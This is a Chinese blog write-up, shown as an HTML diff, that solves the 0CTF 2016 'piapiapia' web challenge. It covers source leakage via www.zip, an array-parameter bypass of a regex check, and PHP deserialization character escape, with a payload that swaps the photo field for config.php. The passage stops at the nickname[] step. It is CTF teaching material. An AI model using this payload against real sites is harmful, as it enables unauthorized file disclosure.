@@ -1,0 +1,466 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>0CTF 2016 piapiapia - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="0x00知识点
+信息泄露
+参数传递数组绕过字符串检测
+...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">0CTF 2016 piapiapia</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/life/revolve.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">0CTF 2016 piapiapia</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 17, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>7401</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ul>
+<li><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5></li>
+<li><h5 id="参数传递数组绕过字符串检测"><a href="#参数传递数组绕过字符串检测" class="headerlink" title="参数传递数组绕过字符串检测"></a>参数传递数组绕过字符串检测</h5></li>
+<li><h5 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h5><h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapia解题详细思路及复现 - g0udan - 博客园 (cnblogs.com)</a></p>
+</li>
+</ul>
+<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题<img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817200805927.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817200805927"></h4><p>进来是一个登录页面，很难登录，且也不是什么sql注入</p>
+<p>f12无发现</p>
+<p>这时候请出dirsearch(记得调低线程，不然会漏掉<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a>)</p>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817201129087.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817201129087"></p>
+<p>通过后台扫描我们有了register页面，也就是注册页面</p>
+<p>还有<a target="_blank" rel="noopener" href="http://www.zip,config.php,update.php,这些我们后面都要用到./">www.zip,config.php,update.php,这些我们后面都要用到。</a></p>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817204317100.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817204317100"></p>
+<p>注册后登录</p>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817201432160.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817201432160"></p>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817201501824.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817201501824"></p>
+<p>进入到updat.php,提示我们上传文件，本来我还以为是传图片马</p>
+<p>结果本题核心不是，是前面扫出的<a target="_blank" rel="noopener" href="http://www.zip源码提示了绕过/">www.zip源码提示了绕过</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; ?php<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp; &amp; $_POST[<span class="hljs-string">&#x27;email&#x27;</span>] &amp; &amp; $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp; &amp; $_FILES[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br>$username = $_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]) | | strlen($_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br>$file = $_FILES[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span> ($file[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> $file[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file($file[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span>.md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>$profile[<span class="hljs-string">&#x27;phone&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;email&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;email&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;nickname&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span>.md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>$user-&gt;update_profile($username, serialize($profile));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>? &gt;<br></code></pre></td></tr></table></figure>
+
+<p>代码分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们已经登录了，非常容易地就满足了。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br></code></pre></td></tr></table></figure>
+
+<p>几个变量值都为POST传参</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (!preg_match(&#x27;/^\d&#123;<span class="hljs-number">11</span>&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))<br>die(&#x27;Invalid phone&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>正则表达式判断是否为11位的数字电话号码</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) | | strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="hljs-number">10</span>)<br>die(&#x27;Invalid nickname&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里判断了nickname是否为字符还有长度是否超过10</p>
+<p>用文章开头的知识点二，如果我们传入的nickname是一个数组</p>
+<p>绕过长度的限制，则可以绕过这正则表达式，使得我们不会die出。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br></code></pre></td></tr></table></figure>
+
+<h5 id="照搬大佬思路："><a href="#照搬大佬思路：" class="headerlink" title=" 照搬大佬思路："></a> 照搬大佬思路：</h5><p>在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。</p>
+<p> 我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params">$username, $new_profile</span>) </span>&#123;<br>	$username = <span class="hljs-built_in">parent</span>::filter($username);<br>	$new_profile = <span class="hljs-built_in">parent</span>::filter($new_profile);<br><br>	$where = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, $new_profile, $where);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>  我们再继续追寻下去<br>filter()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;<br>	$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>	$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>	$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);<br><br>	$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>	$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>	<span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>update()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$table, $key, $value, $where</span>) </span>&#123;<br>	$sql = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br>	<span class="hljs-keyword">return</span> mysql_query($sql);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>  update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p>
+<h5 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h5><ul>
+<li>PHP反序列化字符逃逸<br>举个小例子<br>序列化</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$a = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;defg&#x27;</span>);<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">string</span>(49) &quot;<span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;defg&quot;</span>;&#125;&quot; <br></code></pre></td></tr></table></figure>
+
+<p>反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;123&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;abc&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;defg&quot;</span> &#125; <br></code></pre></td></tr></table></figure>
+
+<p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;123&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;abc&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;qwert&quot;</span> &#125; <br></code></pre></td></tr></table></figure>
+
+<p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br>反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p>
+<ul>
+<li>突破口<br>我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//过滤函数</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;<br>		$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>		$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>		$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);<br><br>		$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>		$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>		<span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$a = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>abc前面的s:3:不变，因为是序列化的时候固定了<br>我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p>
+<h5 id="解题继续"><a href="#解题继续" class="headerlink" title="解题继续"></a>解题继续</h5><p>nickname传入，并且nickname要改成nickname[]</p>
